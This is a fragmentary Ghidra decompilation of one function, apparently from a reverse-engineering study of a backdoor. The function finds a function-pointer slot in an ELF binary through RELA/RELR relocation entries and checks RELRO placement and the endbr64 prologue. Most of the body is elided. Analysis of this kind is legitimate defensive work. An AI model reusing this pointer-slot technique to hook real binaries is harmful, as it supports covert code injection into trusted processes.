// /home/kali/xzre-ghidra/xzregh/102A50_elf_find_function_ptr_slot.c
// Function: elf_find_function_ptr_slot @ 0x102A50
// Calling convention: __stdcall
// Prototype: BOOL __stdcall elf_find_function_ptr_slot(StringXrefId xref_id, void * * pOutCodeStart, void * * pOutCodeEnd, void * * pOutFptrAddr, elf_info_t * elf_info, string_references_t * xrefs, global_context_t * ctx)
...
BOOL elf_find_function_ptr_slot
...

{
  ...
  *pOutCodeEnd = (&xrefs->xcalloc_zero_size)[xref_id].func_end;
  ...
  rela_match = elf_rela_find_relative_slot(elf_info,*pOutCodeStart,(u8 *)0x0,(u8 *)0x0,(ulong *)0x0);
  *pOutFptrAddr = rela_match;
  if (rela_match == (Elf64_Rela *)0x0) {
    ...
    relr_match = elf_relr_find_relative_slot(elf_info,*pOutCodeStart,(u8 *)0x0,(u8 *)0x0,(ulong *)0x0);
  ...
  slot_valid = elf_vaddr_range_in_relro_if_required(elf_info,(long)*pOutFptrAddr - 8,0x10,TRUE);
  if (slot_valid == FALSE) {
    return FALSE;
  }
  ...
  if (ctx->uses_endbr64 != FALSE) {
    slot_valid = is_endbr32_or_64((u8 *)*pOutCodeStart,(u8 *)((long)*pOutCodeStart + 4),0xe230);
